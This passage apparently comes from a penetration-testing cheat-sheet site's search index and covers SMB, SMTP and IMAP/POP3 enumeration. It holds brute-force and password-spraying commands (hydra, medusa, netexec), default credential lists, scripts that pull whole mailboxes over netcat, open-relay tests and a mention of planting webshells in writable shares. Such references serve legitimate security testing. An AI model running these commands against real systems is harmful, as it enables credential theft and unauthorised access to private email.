Authentication","text":"<pre><code># When NTLM is disabled\nnetexec smb target -k -u user -p pass\n\n# Impacket with Kerberos\nsmbclient.py 'domain/user:pass@target' -k -no-pass\n</code></pre>"},{"location":"file/smb/#password-spraying","title":"Password Spraying","text":"<pre><code># Test common passwords against user list\nnetexec smb target -u users.txt -p 'Password123' --continue-on-success\n</code></pre>"},{"location":"file/smb/#quick-reference-commands","title":"Quick Reference Commands","text":""},{"location":"file/smb/#initial-discovery","title":"Initial Discovery","text":"<pre><code>nmap -p 139,445 --open target\nnetexec smb target\n</code></pre>"},{"location":"file/smb/#share-enumeration","title":"Share Enumeration","text":"<pre><code>smbclient -L -N //target\nnetexec smb target -u guest -p '' --shares\n</code></pre>"},{"location":"file/smb/#file-access","title":"File Access","text":"<pre><code>smbclient //target/share -N\nsmbclient //target/share -U user%pass\n</code></pre>"},{"location":"file/smb/#user-enumeration_1","title":"User Enumeration","text":"<pre><code>lookupsid.py guest@target -no-pass\nnetexec smb target -u guest -p '' --rid-brute\n</code></pre>"},{"location":"file/smb/#vulnerability-scan","title":"Vulnerability Scan","text":"<pre><code>nmap --script smb-vuln* -p 139,445 target\n</code></pre>"},{"location":"file/smb/#testing-checklist","title":"Testing Checklist","text":""},{"location":"file/smb/#discovery","title":"Discovery","text":"<ul> <li> Port 139/445 open</li> <li> SMB version identification</li> <li> OS fingerprinting</li> <li> Domain information</li> </ul>"},{"location":"file/smb/#authentication-testing","title":"Authentication Testing","text":"<ul> <li> Null session access</li> <li> Guest account access</li> <li> Anonymous share listing</li> <li> Default credentials</li> </ul>"},{"location":"file/smb/#share-enumeration_1","title":"Share Enumeration","text":"<ul> <li> List all available shares</li> <li> Test access to each share</li> <li> Identify writable shares</li> <li> Check share permissions</li> </ul>"},{"location":"file/smb/#file-discovery","title":"File Discovery","text":"<ul> <li> Enumerate files in accessible shares</li> <li> Search for sensitive files</li> <li> Download interesting files</li> <li> Check for backup files</li> </ul>"},{"location":"file/smb/#user-enumeration_2","title":"User Enumeration","text":"<ul> <li> RID cycling attack</li> <li> SAM remote protocol</li> <li> Domain user listing</li> <li> User detail extraction</li> </ul>"},{"location":"file/smb/#vulnerability-assessment","title":"Vulnerability Assessment","text":"<ul> <li> SMB vulnerability scan</li> <li> SMBv1 detection</li> <li> Signing requirements</li> <li> Known CVE checks</li> </ul>"},{"location":"file/smb/#critical-vulnerabilities","title":"Critical Vulnerabilities","text":""},{"location":"file/smb/#anonymous-access","title":"Anonymous Access","text":"<ul> <li>Impact: Information disclosure, potential data theft</li> <li>Detection: <code>smbclient -L -N //target</code> succeeds</li> <li>Exploitation: Access sensitive shares without authentication</li> </ul>"},{"location":"file/smb/#guest-account-enabled","title":"Guest Account Enabled","text":"<ul> <li>Impact: User enumeration, share access</li> <li>Detection: <code>netexec smb target -u guest -p ''</code> succeeds</li> <li>Exploitation: RID cycling, share enumeration</li> </ul>"},{"location":"file/smb/#writable-shares","title":"Writable Shares","text":"<ul> <li>Impact: File upload, potential malware deployment</li> <li>Detection: Successful file upload to share</li> <li>Exploitation: Upload webshells, malicious executables</li> </ul>"},{"location":"mail/","title":"Mail Services","text":"<p>Mail services provide essential communication infrastructure and often reveal valuable information about users and system configurations.</p>"},{"location":"mail/#overview","title":"Overview","text":"<p>Mail service enumeration focuses on:</p> <ul> <li>User enumeration and validation</li> <li>Authentication mechanism testing</li> <li>Configuration disclosure</li> <li>Relay testing and abuse</li> <li>SSL/TLS security assessment</li> </ul>"},{"location":"mail/#common-mail-services","title":"Common Mail Services","text":""},{"location":"mail/#smtp-ports-25-465-587","title":"SMTP (Ports 25, 465, 587)","text":"<p>Simple Mail Transfer Protocol handles email transmission between servers.</p> <p>Key Attack Vectors: - User enumeration via VRFY/EXPN commands - Open relay testing - Authentication bypass techniques - SSL/TLS configuration weaknesses</p> <p>View SMTP Cheat Sheet</p>"},{"location":"mail/#imappop3-ports-143-993-110-995","title":"IMAP/POP3 (Ports 143, 993, 110, 995)","text":"<p>Email retrieval protocols for client access to mailboxes.</p> <p>Key Attack Vectors: - Credential brute forcing - Plaintext authentication interception - SSL certificate validation bypass - Mailbox enumeration and access</p> <p>View IMAP/POP3 Cheat Sheet</p>"},{"location":"mail/#general-methodology","title":"General Methodology","text":""},{"location":"mail/#1-discovery","title":"1. Discovery","text":"<pre><code># Port scanning\nnmap -p 25,110,143,465,587,993,995 target\n\n# Service detection\nnmap -sV -sC -p &lt;ports&gt; target\n</code></pre>"},{"location":"mail/#2-enumeration","title":"2. Enumeration","text":"<pre><code># SMTP user enumeration\nsmtp-user-enum -M VRFY -U users.txt -t target\n\n# Banner grabbing\ntelnet target 25\nnc target 110\n</code></pre>"},{"location":"mail/#3-authentication-testing","title":"3. Authentication Testing","text":"<pre><code># Credential attacks\nhydra -L users.txt -P passwords.txt smtp://target\nhydra -L users.txt -P passwords.txt imap://target\n\n# Manual authentication\ntelnet target 110\n</code></pre>"},{"location":"mail/#4-configuration-analysis","title":"4. Configuration Analysis","text":"<ul> <li>SSL/TLS cipher strength</li> <li>Authentication methods supported</li> <li>Relay configuration</li> <li>Rate limiting implementation</li> </ul>"},{"location":"mail/#security-considerations","title":"Security Considerations","text":"<p>When testing mail services:</p> <ul> <li>User privacy - Respect email privacy during testing</li> <li>Service disruption - Avoid overwhelming mail servers</li> <li>Legal compliance - Follow applicable privacy laws</li> <li>Rate limiting - Be aware of connection limits</li> </ul>"},{"location":"mail/#common-vulnerabilities","title":"Common Vulnerabilities","text":""},{"location":"mail/#smtp-issues","title":"SMTP Issues","text":"<ul> <li>Open mail relays</li> <li>User enumeration</li> <li>Weak authentication</li> <li>SSL/TLS misconfigurations</li> </ul>"},{"location":"mail/#imappop3-issues","title":"IMAP/POP3 Issues","text":"<ul> <li>Plaintext authentication</li> <li>Weak credentials</li> <li>SSL certificate problems</li> <li>Unauthorized mailbox access</li> </ul>"},{"location":"mail/#tools-and-resources","title":"Tools and Resources","text":""},{"location":"mail/#essential-tools","title":"Essential Tools","text":"<ul> <li>nmap - Service discovery and scripting</li> <li>telnet/nc - Manual protocol interaction</li> <li>smtp-user-enum - SMTP user enumeration</li> <li>hydra - Authentication attacks</li> </ul>"},{"location":"mail/#specialized-tools","title":"Specialized Tools","text":"<ul> <li>swaks - SMTP testing toolkit</li> <li>sendemail - Command-line email client</li> <li>openssl - SSL/TLS testing</li> <li>curl - IMAP/POP3 client functionality</li> </ul> <p>Select a specific mail service above to access detailed enumeration and exploitation techniques.</p>"},{"location":"mail/imap-pop3/","title":"IMAP &amp; POP3 Enumeration Cheat Sheet","text":""},{"location":"mail/imap-pop3/#table-of-contents","title":"Table of Contents","text":"<ol> <li>Overview</li> <li>Ports &amp; Protocols</li> <li>Quick Discovery</li> <li>Essential Enumeration Workflow</li> <li>Service Detection</li> <li>Banner Analysis</li> <li>Authentication Testing</li> <li>Email Access</li> <li>Manual Interaction Techniques</li> <li>IMAP Commands</li> <li>POP3 Commands</li> <li>SSL/TLS Connections</li> <li>Credential Attacks</li> <li>Brute Force Attacks</li> <li>Password Spraying</li> <li>Email Enumeration &amp; Extraction</li> <li>Scripted Enumeration</li> <li>Common Vulnerabilities</li> <li>Quick Reference Commands</li> <li>Testing Checklist</li> <li>Critical Security Issues</li> </ol>"},{"location":"mail/imap-pop3/#overview","title":"Overview","text":"<p>IMAP (Internet Message Access Protocol) and POP3 (Post Office Protocol v3) are email retrieval protocols that allow clients to access emails stored on mail servers. Both protocols are commonly found in corporate environments and can expose sensitive information.</p>"},{"location":"mail/imap-pop3/#key-functions","title":"Key Functions","text":"<ul> <li>Email Retrieval: Download emails from mail servers</li> <li>Authentication: User credential validation</li> <li>Mailbox Management: IMAP supports server-side folder operations</li> <li>Multi-Device Access: IMAP allows synchronized access across devices</li> </ul>"},{"location":"mail/imap-pop3/#why-imappop3-matter-in-pentesting","title":"Why IMAP/POP3 Matter in Pentesting","text":"<ul> <li>Credential Exposure: Often use weak or default passwords</li> <li>Information Disclosure: Email content reveals sensitive data</li> <li>Lateral Movement: Valid credentials may work on other services</li> <li>Business Intelligence: Email metadata exposes organizational structure</li> <li>Plaintext Protocols: Unencrypted traffic exposes credentials</li> </ul>"},{"location":"mail/imap-pop3/#common-attack-vectors","title":"Common Attack Vectors","text":"<ul> <li>Brute Force Attacks: Weak password policies</li> <li>Credential Stuffing: Reused credentials across services</li> <li>Plaintext Sniffing: Unencrypted authentication</li> <li>Information Harvesting: Email content and metadata extraction</li> <li>Configuration Exploitation: Debug logging, anonymous access</li> </ul>"},{"location":"mail/imap-pop3/#ports-protocols","title":"Ports &amp; Protocols","text":"<pre><code>110/tcp  - POP3 (Post Office Protocol v3)\n143/tcp  - IMAP (Internet Message Access Protocol)\n993/tcp  - IMAPS (IMAP over SSL/TLS)\n995/tcp  - POP3S (POP3 over SSL/TLS)\n</code></pre>"},{"location":"mail/imap-pop3/#protocol-comparison","title":"Protocol Comparison","text":"Feature IMAP POP3 Server Storage Yes (persistent) No (download &amp; delete) Multiple Clients Yes (synchronized) No (single client) Folder Support Yes No Partial Download Yes No Default Port 143 (993 SSL) 110 (995 SSL) Complexity High Low"},{"location":"mail/imap-pop3/#quick-discovery","title":"Quick Discovery","text":"<pre><code># Port scan for email services\nnmap -p 110,143,993,995 --open -sV target\n\n# IMAP capabilities detection\nnmap -p 143,993 --script=imap-capabilities target\n\n# Comprehensive email service scan\nnmap -p 110,143,993,995 -sC -sV target\n</code></pre>"},{"location":"mail/imap-pop3/#essential-enumeration-workflow","title":"Essential Enumeration Workflow","text":""},{"location":"mail/imap-pop3/#1-service-detection","title":"1. Service Detection","text":""},{"location":"mail/imap-pop3/#banner-grabbing","title":"Banner Grabbing","text":"<pre><code># IMAP banner\nnc target 143\n\n# POP3 banner\nnc target 110\n\n# Check for common responses:\n# * OK IMAP4rev1 service ready\n# +OK POP3 server ready\n</code></pre>"},{"location":"mail/imap-pop3/#capability-enumeration","title":"Capability Enumeration","text":"<pre><code># IMAP capabilities\necho \"A1 CAPABILITY\" | nc target 143\n\n# POP3 capabilities  \necho \"CAPA\" | nc target 110\n\n# Look for authentication methods:\n# AUTH=PLAIN, AUTH=LOGIN, AUTH=CRAM-MD5\n</code></pre>"},{"location":"mail/imap-pop3/#2-banner-analysis","title":"2. Banner Analysis","text":""},{"location":"mail/imap-pop3/#service-identification","title":"Service Identification","text":"<pre><code># Detailed service fingerprinting\nnmap -p 143,993 --script=imap-ntlm-info target\nnmap -p 110,995 --script=pop3-ntlm-info target\n\n# Version detection\nnmap -sV -p 110,143,993,995 target\n</code></pre>"},{"location":"mail/imap-pop3/#3-authentication-testing","title":"3. Authentication Testing","text":""},{"location":"mail/imap-pop3/#default-credentials","title":"Default Credentials","text":"<pre><code># Common default accounts to test:\n# admin:admin\n# admin:password\n# test:test\n# guest:guest\n# user:user\n</code></pre>"},{"location":"mail/imap-pop3/#manual-authentication","title":"Manual Authentication","text":"<pre><code># IMAP login test\necho \"A1 LOGIN admin admin\" | nc target 143\n\n# POP3 login test\n(echo \"USER admin\"; echo \"PASS admin\") | nc target 110\n</code></pre>"},{"location":"mail/imap-pop3/#4-email-access","title":"4. Email Access","text":""},{"location":"mail/imap-pop3/#imap-email-enumeration","title":"IMAP Email Enumeration","text":"<pre><code># Connect and authenticate\ntelnet target 143\nA1 LOGIN username password\nA2 LIST \"\" \"*\"              # List all mailboxes\nA3 SELECT INBOX             # Select inbox\nA4 SEARCH ALL               # List all email IDs\nA5 FETCH 1 BODY[TEXT]       # Get email content\nA6 LOGOUT\n</code></pre>"},{"location":"mail/imap-pop3/#pop3-email-enumeration","title":"POP3 Email Enumeration","text":"<pre><code># Connect and enumerate\ntelnet target 110\nUSER username\nPASS password\nSTAT                        # Get message count\nLIST                        # List all messages\nRETR 1                      # Retrieve first message\nQUIT\n</code></pre>"},{"location":"mail/imap-pop3/#manual-interaction-techniques","title":"Manual Interaction Techniques","text":""},{"location":"mail/imap-pop3/#imap-commands","title":"IMAP Commands","text":"<pre><code># Essential IMAP commands for enumeration\nA1 CAPABILITY               # Show server capabilities\nA2 LOGIN user pass          # Authenticate\nA3 LIST \"\" \"*\"              # List all folders\nA4 SELECT INBOX             # Select mailbox\nA5 SEARCH ALL               # List message IDs\nA6 FETCH 1 BODY[HEADER]     # Get headers only\nA7 FETCH 1 BODY[TEXT]       # Get message body\nA8 FETCH 1 BODY[]           # Get full message\nA9 CREATE \"Testing\"         # Create folder (if writable)\nA10 LOGOUT                  # Disconnect\n</code></pre>"},{"location":"mail/imap-pop3/#pop3-commands","title":"POP3 Commands","text":"<pre><code># Essential POP3 commands\nCAPA                        # Server capabilities\nUSER username               # Set username\nPASS password               # Set password\nSTAT                        # Message statistics\nLIST                        # List all messages\nLIST 1                      # Info for message 1\nRETR 1                      # Retrieve message 1\nTOP 1 10                    # Get first 10 lines of message 1\nDELE 1                      # Mark message 1 for deletion\nRSET                        # Reset session\nQUIT                        # Close connection\n</code></pre>"},{"location":"mail/imap-pop3/#ssltls-connections","title":"SSL/TLS Connections","text":"<pre><code># IMAPS connection\nopenssl s_client -connect target:993\n\n# POP3S connection\nopenssl s_client -connect target:995\n\n# Ignore certificate errors\nopenssl s_client -connect target:993 -verify_return_error\n\n# Test specific SSL/TLS versions\nopenssl s_client -connect target:993 -tls1_2\n</code></pre>"},{"location":"mail/imap-pop3/#credential-attacks","title":"Credential Attacks","text":""},{"location":"mail/imap-pop3/#brute-force-attacks","title":"Brute Force Attacks","text":""},{"location":"mail/imap-pop3/#hydra","title":"Hydra","text":"<pre><code># IMAP brute force\nhydra -L users.txt -P passwords.txt imap://target\n\n# POP3 brute force  \nhydra -L users.txt -P passwords.txt pop3://target\n\n# IMAPS/POP3S brute force\nhydra -L users.txt -P passwords.txt imaps://target\nhydra -L users.txt -P passwords.txt pop3s://target\n\n# Single user, multiple passwords\nhydra -l admin -P passwords.txt imap://target\n\n# Throttled attack (slower)\nhydra -L users.txt -P passwords.txt -t 1 -W 3 imap://target\n</code></pre>"},{"location":"mail/imap-pop3/#medusa","title":"Medusa","text":"<pre><code># IMAP brute force\nmedusa -h target -U users.txt -P passwords.txt -M imap\n\n# POP3 brute force\nmedusa -h target -U users.txt -P passwords.txt -M pop3\n\n# Single user attack\nmedusa -h target -u admin -P passwords.txt -M imap\n</code></pre>"},{"location":"mail/imap-pop3/#password-spraying","title":"Password Spraying","text":"<pre><code># Test common passwords against user list\nhydra -L users.txt -p 'Password123' imap://target\nhydra -L users.txt -p 'password' imap://target\nhydra -L users.txt -p 'admin' imap://target\n\n# Seasonal passwords\nhydra -L users.txt -p 'Summer2024!' imap://target\n</code></pre>"},{"location":"mail/imap-pop3/#email-enumeration-extraction","title":"Email Enumeration &amp; Extraction","text":""},{"location":"mail/imap-pop3/#using-curl","title":"Using cURL","text":"<pre><code># IMAP with cURL\ncurl -k 'imaps://target' --user username:password\n\n# POP3 with cURL\ncurl -k 'pop3s://target' --user username:password\n\n# List specific folder\ncurl -k 'imaps://target/INBOX' --user username:password\n\n# Download specific message\ncurl -k 'imaps://target/INBOX;UID=1' --user username:password\n</code></pre>"},{"location":"mail/imap-pop3/#email-content-analysis","title":"Email Content Analysis","text":"<pre><code># Search for specific content in IMAP\nA1 LOGIN user pass\nA2 SELECT INBOX\nA3 SEARCH TEXT \"password\"           # Search for \"password\"\nA4 SEARCH FROM \"admin\"              # Search by sender\nA5 SEARCH SUBJECT \"confidential\"    # Search by subject\nA6 SEARCH SINCE \"01-Jan-2024\"       # Search by date\n</code></pre>"},{"location":"mail/imap-pop3/#bulk-email-extraction","title":"Bulk Email Extraction","text":"<pre><code># Extract all emails from INBOX\nfor i in {1..10}; do\n    echo \"A$i FETCH $i BODY[]\" | nc target 143\ndone\n\n# Save specific email\necho \"A1 LOGIN user pass\nA2 SELECT INBOX  \nA3 FETCH 1 BODY[]\" | nc target 143 &gt; email_1.txt\n</code></pre>"},{"location":"mail/imap-pop3/#scripted-enumeration","title":"Scripted Enumeration","text":""},{"location":"mail/imap-pop3/#python-imap-script","title":"Python IMAP Script","text":"<pre><code>#!/usr/bin/env python3\nimport imaplib\nimport sys\n\ndef test_imap_login(host, user, password):\n    try:\n        server = imaplib.IMAP4(host, 143)\n        server.login(user, password)\n        server.select(\"INBOX\")\n        status, messages = server.search(None, \"ALL\")\n        print(f\"[+] Login successful: {user}:{password}\")\n        print(f\"[+] Messages found: {len(messages[0].split())}\")\n        server.logout()\n        return True\n    except:\n        print(f\"[-] Login failed: {user}:{password}\")\n        return False\n\n# Usage\ntest_imap_login(\"target\", \"admin\", \"password\")\n</code></pre>"},{"location":"mail/imap-pop3/#bash-email-extractor","title":"Bash Email Extractor","text":"<pre><code>#!/bin/bash\n# Extract all emails from IMAP\n\nHOST=$1\nUSER=$2\nPASS=$3\n\necho \"A1 LOGIN $USER $PASS\nA2 SELECT INBOX\nA3 SEARCH ALL\" | nc $HOST 143 | grep \"SEARCH\" | cut -d' ' -f3- | tr ' ' '\\n' | while read msgid; do\n    echo \"A4 FETCH $msgid BODY[]\" | nc $HOST 143 &gt; \"email_${msgid}.txt\"\ndone\n</code></pre>"},{"location":"mail/imap-pop3/#common-vulnerabilities","title":"Common Vulnerabilities","text":""},{"location":"mail/imap-pop3/#plaintext-authentication","title":"Plaintext Authentication","text":"<pre><code># VULNERABILITY: Credentials sent in cleartext\n# Detection: Successful login over ports 110/143\necho \"A1 LOGIN admin password\" | nc target 143\n\n# Mitigation: Use SSL/TLS (ports 993/995)\n</code></pre>"},{"location":"mail/imap-pop3/#weak-authentication-mechanisms","title":"Weak Authentication Mechanisms","text":"<pre><code># Check supported authentication methods\necho \"A1 CAPABILITY\" | nc target 143\n\n# Look for insecure methods:\n# AUTH=PLAIN (base64 encoded plaintext)\n# No SSL/TLS requirement\n</code></pre>"},{"location":"mail/imap-pop3/#information-disclosure","title":"Information Disclosure","text":"<pre><code># Debug logging enabled\n# Look for verbose server responses\n# Banner information disclosure\n\n# Example vulnerable banner:\n# * OK [CAPABILITY IMAP4rev1 AUTH=PLAIN] Dovecot v2.3.16 ready\n</code></pre>"},{"location":"mail/imap-pop3/#anonymous-access","title":"Anonymous Access","text":"<pre><code># Test for anonymous/guest access\necho \"A1 LOGIN anonymous ''\" | nc target 143\necho \"A1 LOGIN guest guest\" | nc target 143\n\n# VULNERABILITY: Unauthorized email access\n</code></pre>"},{"location":"mail/imap-pop3/#quick-reference-commands","title":"Quick Reference Commands","text":""},{"location":"mail/imap-pop3/#discovery","title":"Discovery","text":"<pre><code>nmap -p 110,143,993,995 --script=imap-capabilities,pop3-capabilities target\nnc target 143\nnc target 110\n</code></pre>"},{"location":"mail/imap-pop3/#authentication","title":"Authentication","text":"<pre><code>hydra -L users.txt -P passwords.txt imap://target\nmedusa -h target -U users.txt -P passwords.txt -M imap\necho \"A1 LOGIN user pass\" | nc target 143\n</code></pre>"},{"location":"mail/imap-pop3/#email-access","title":"Email Access","text":"<pre><code>curl -k 'imaps://target' --user user:pass\ntelnet target 143\nopenssl s_client -connect target:993\n</code></pre>"},{"location":"mail/imap-pop3/#ssltls-testing","title":"SSL/TLS Testing","text":"<pre><code>openssl s_client -connect target:993\nopenssl s_client -connect target:995\nnmap --script ssl-enum-ciphers -p 993,995 target\n</code></pre>"},{"location":"mail/imap-pop3/#testing-checklist","title":"Testing Checklist","text":""},{"location":"mail/imap-pop3/#discovery-detection","title":"Discovery &amp; Detection","text":"<ul> <li> Port scan for 110,143,993,995</li> <li> Banner grabbing and service identification</li> <li> Capability enumeration (AUTH methods)</li> <li> SSL/TLS configuration assessment</li> </ul>"},{"location":"mail/imap-pop3/#authentication-testing","title":"Authentication Testing","text":"<ul> <li> Default credential testing</li> <li> Brute force attacks (rate-limited)</li> <li> Password spraying with common passwords</li> <li> Anonymous/guest access attempts</li> </ul>"},{"location":"mail/imap-pop3/#protocol-analysis","title":"Protocol Analysis","text":"<ul> <li> Plaintext vs encrypted connections</li> <li> Supported authentication mechanisms</li> <li> SSL/TLS certificate validation</li> <li> Protocol version identification</li> </ul>"},{"location":"mail/imap-pop3/#email-enumeration","title":"Email Enumeration","text":"<ul> <li> Mailbox/folder listing</li> <li> Message count and metadata</li> <li> Email content extraction</li> <li> Sensitive information discovery</li> </ul>"},{"location":"mail/imap-pop3/#security-assessment","title":"Security Assessment","text":"<ul> <li> Debug logging configuration</li> <li> Information disclosure in banners</li> <li> SSL/TLS cipher strength</li> <li> Rate limiting effectiveness</li> </ul>"},{"location":"mail/imap-pop3/#critical-security-issues","title":"Critical Security Issues","text":""},{"location":"mail/imap-pop3/#plaintext-authentication_1","title":"Plaintext Authentication","text":"<ul> <li>Impact: Credential exposure, session hijacking</li> <li>Detection: Successful authentication over ports 110/143</li> <li>Exploitation: Network sniffing, credential harvesting</li> </ul>"},{"location":"mail/imap-pop3/#weak-ssltls-configuration","title":"Weak SSL/TLS Configuration","text":"<ul> <li>Impact: Man-in-the-middle attacks, credential theft</li> <li>Detection: Weak ciphers, outdated TLS versions</li> <li>Exploitation: SSL strip attacks, certificate bypass</li> </ul>"},{"location":"mail/imap-pop3/#information-disclosure_1","title":"Information Disclosure","text":"<ul> <li>Impact: Service fingerprinting, reconnaissance data</li> <li>Detection: Verbose banners, debug information</li> <li>Exploitation: Version-specific exploit identification</li> </ul>"},{"location":"mail/imap-pop3/#weak-authentication","title":"Weak Authentication","text":"<ul> <li>Impact: Unauthorized email access, data theft</li> <li>Detection: Successful brute force attacks</li> <li>Exploitation: Email content extraction, lateral movement</li> </ul>"},{"location":"mail/imap-pop3/#anonymous-access_1","title":"Anonymous Access","text":"<ul> <li>Impact: Unauthorized email access without credentials</li> <li>Detection: Successful anonymous login attempts</li> <li>Exploitation: Complete mailbox access, data exfiltration</li> </ul>"},{"location":"mail/imap-pop3/#advanced-techniques","title":"Advanced Techniques","text":""},{"location":"mail/imap-pop3/#protocol-downgrade-attacks","title":"Protocol Downgrade Attacks","text":"<pre><code># Force plaintext over encrypted ports\nopenssl s_client -connect target:993 -cipher NULL\n\n# Test for STARTTLS downgrade\necho \"A1 CAPABILITY\" | nc target 143\n</code></pre>"},{"location":"mail/imap-pop3/#email-forensics","title":"Email Forensics","text":"<pre><code># Extract email headers for analysis\nA1 FETCH 1 BODY[HEADER]\n\n# Look for internal IP addresses, domains\n# Analyze email routing information\n# Extract attachment metadata\n</code></pre>"},{"location":"mail/imap-pop3/#persistence-techniques","title":"Persistence Techniques","text":"<pre><code># Email forwarding rules (if IMAP supports)\n# Search for sensitive keywords across all emails\n# Monitor for new emails with specific content\n\n# Continuous monitoring script\nwhile true; do\n    echo \"A1 LOGIN user pass; A2 SELECT INBOX; A3 SEARCH ALL\" | nc target 143\n    sleep 300\ndone\n</code></pre>"},{"location":"mail/smtp/","title":"SMTP Enumeration Cheat Sheet","text":""},{"location":"mail/smtp/#table-of-contents","title":"Table of Contents","text":"<ol> <li>Overview</li> <li>Ports &amp; Protocols</li> <li>Quick Discovery</li> <li>Essential Enumeration Workflow</li> <li>Banner Grabbing</li> <li>Command Discovery</li> <li>User Enumeration</li> <li>Open Relay Testing</li> <li>Manual Interaction Techniques</li> <li>SMTP Commands</li> <li>User Verification Methods</li> <li>Automated Enumeration</li> <li>Authentication Testing</li> <li>Advanced Techniques</li> <li>Common Vulnerabilities</li> <li>Quick Reference Commands</li> <li>Testing Checklist</li> <li>Critical Security Issues</li> </ol>"},{"location":"mail/smtp/#overview","title":"Overview","text":"<p>SMTP (Simple Mail Transfer Protocol) is the standard protocol for sending emails between mail servers and from clients to servers. SMTP services often reveal extensive information about users, system configuration, and mail infrastructure, making them valuable targets for reconnaissance.</p>"},{"location":"mail/smtp/#key-functions","title":"Key Functions","text":"<ul> <li>Mail Transfer: Send emails between mail servers</li> <li>Mail Submission: Accept emails from clients for delivery</li> <li>User Verification: Validate email addresses and users</li> <li>Mail Routing: Forward emails to appropriate destinations</li> </ul>"},{"location":"mail/smtp/#why-smtp-matters-in-pentesting","title":"Why SMTP Matters in Pentesting","text":"<ul> <li>User Enumeration: VRFY and EXPN commands reveal valid users</li> <li>Information Disclosure: Banners expose software versions and configuration</li> <li>Open Relay Detection: Misconfigured servers allow mail abuse</li> <li>Authentication Testing: Weak credentials for mail submission</li> <li>Network Mapping: Mail server topology and routing information</li> </ul>"},{"location":"mail/smtp/#common-attack-vectors","title":"Common Attack Vectors","text":"<ul> <li>User Enumeration: VRFY, EXPN, RCPT TO commands</li> <li>Banner Grabbing: Version and software disclosure</li> <li>Open Relay Abuse: Unauthorized mail sending</li> <li>Authentication Attacks: Brute force mail submission</li> <li>Information Gathering: Mail server configuration exposure</li> </ul>"},{"location":"mail/smtp/#ports-protocols","title":"Ports &amp; Protocols","text":"<pre><code>25/tcp   - SMTP (Simple Mail Transfer Protocol)\n465/tcp  - SMTPS (SMTP over SSL/TLS - deprecated)\n587/tcp  - SMTP Submission (STARTTLS preferred)\n2525/tcp - Alternative SMTP (non-standard)\n</code></pre>"},{"location":"mail/smtp/#protocol-variations","title":"Protocol Variations","text":"Port Protocol Purpose Security 25 SMTP Mail transfer between servers Usually plaintext 465 SMTPS SSL/TLS encrypted (deprecated) Encrypted 587 SMTP Submission Client mail submission STARTTLS"},{"location":"mail/smtp/#quick-discovery","title":"Quick Discovery","text":"<pre><code># Port scan for SMTP services\nnmap -p 25,465,587,2525 --open -sV target\n\n# SMTP-specific scripts\nnmap -p 25,465,587 --script=smtp-enum-users,smtp-commands,smtp-open-relay target\n\n# Banner grabbing\nnc target 25\ntelnet target 25\n</code></pre>"},{"location":"mail/smtp/#essential-enumeration-workflow","title":"Essential Enumeration Workflow","text":""},{"location":"mail/smtp/#1-banner-grabbing","title":"1. Banner Grabbing","text":""},{"location":"mail/smtp/#manual-banner-collection","title":"Manual Banner Collection","text":"<pre><code># Netcat connection\nnc -nv target 25\n\n# Telnet connection\ntelnet target 25\n\n# SSL/TLS connections\nopenssl s_client -connect target:465\nopenssl s_client -connect target:587 -starttls smtp\n\n# Look for information disclosure in banners:\n# 220 mail.example.com ESMTP Postfix (Ubuntu)\n# 220 mail.company.com Microsoft ESMTP MAIL Service ready\n</code></pre>"},{"location":"mail/smtp/#automated-banner-analysis","title":"Automated Banner Analysis","text":"<pre><code># Nmap banner grabbing\nnmap -p 25,465,587 -sV --script=banner target\n\n# Service version detection\nnmap -p 25 -sV target\n</code></pre>"},{"location":"mail/smtp/#2-command-discovery","title":"2. Command Discovery","text":""},{"location":"mail/smtp/#supported-command-enumeration","title":"Supported Command Enumeration","text":"<pre><code># Manual command discovery\necho \"EHLO test.com\" | nc target 25\necho \"HELP\" | nc target 25\n\n# Look for available commands:\n# 250-VRFY\n# 250-EXPN\n# 250-AUTH LOGIN PLAIN\n# 250-STARTTLS\n</code></pre>"},{"location":"mail/smtp/#nmap-command-discovery","title":"Nmap Command Discovery","text":"<pre><code># SMTP commands script\nnmap -p 25 --script=smtp-commands target\n\n# Authentication methods\nnmap -p 25,587 --script=smtp-auth-methods target\n</code></pre>"},{"location":"mail/smtp/#3-user-enumeration","title":"3. User Enumeration","text":""},{"location":"mail/smtp/#vrfy-command-verify","title":"VRFY Command (Verify)","text":"<pre><code># Manual VRFY testing\necho \"VRFY root\" | nc target 25\necho \"VRFY admin\" | nc target 25\necho \"VRFY user\" | nc target 25\n\n# Automated VRFY enumeration\nfor user in root admin user guest; do\n    echo \"VRFY $user\" | nc target 25\ndone\n\n# Response analysis:\n# 250 2.1.5 root &lt;root@target.com&gt;     # User exists\n# 550 5.1.1 No such user               # User doesn't exist\n# 252 2.1.5 Cannot verify user         # Inconclusive\n</code></pre>"},{"location":"mail/smtp/#expn-command-expand","title":"EXPN Command (Expand)","text":"<pre><code># Manual EXPN testing\necho \"EXPN root\" | nc target 25\necho \"EXPN admin\" | nc target 25\n\n# Test common mailing lists\necho \"EXPN all\" | nc target 25\necho \"EXPN everyone\" | nc target 25\n</code></pre>"},{"location":"mail/smtp/#rcpt-to-method","title":"RCPT TO Method","text":"<pre><code># User enumeration via RCPT TO\necho -e \"EHLO test.com\\nMAIL FROM:&lt;test@test.com&gt;\\nRCPT TO:&lt;root@target.com&gt;\" | nc target 25\n\n# Response analysis:\n# 250 2.1.5 root@target.com... Recipient ok    # User exists\n# 550 5.1.1 root@target.com... User unknown    # User doesn't exist\n</code></pre>"},{"location":"mail/smtp/#4-open-relay-testing","title":"4. Open Relay Testing","text":""},{"location":"mail/smtp/#basic-open-relay-test","title":"Basic Open Relay Test","text":"<pre><code># Test external to external relay\necho -e \"EHLO test.com\\nMAIL FROM:&lt;attacker@external.com&gt;\\nRCPT TO:&lt;victim@external.com&gt;\\nDATA\\nSubject: Relay Test\\n\\nThis is a relay test.\\n.\\nQUIT\" | nc target 25\n\n# Response analysis:\n# 250 Message accepted for delivery     # VULNERABLE: Open relay\n# 554 Relay access denied              # Protected against relay\n</code></pre>"},{"location":"mail/smtp/#advanced-relay-testing","title":"Advanced Relay Testing","text":"<pre><code># Multiple relay test scenarios\n# Local to external\necho -e \"MAIL FROM:&lt;local@target.com&gt;\\nRCPT TO:&lt;external@test.com&gt;\" | nc target 25\n\n# External to local\necho -e \"MAIL FROM:&lt;external@test.com&gt;\\nRCPT TO:&lt;local@target.com&gt;\" | nc target 25\n\n# Localhost variations\necho -e \"MAIL FROM:&lt;test@localhost&gt;\\nRCPT TO:&lt;external@test.com&gt;\" | nc target 25\n</code></pre>"},{"location":"mail/smtp/#manual-interaction-techniques","title":"Manual Interaction Techniques","text":""},{"location":"mail/smtp/#smtp-commands","title":"SMTP Commands","text":"<pre><code># Complete SMTP session example\ntelnet target 25\n\n220 mail.target.com ESMTP ready\nEHLO attacker.com\n250-mail.target.com Hello attacker.com\n250-SIZE 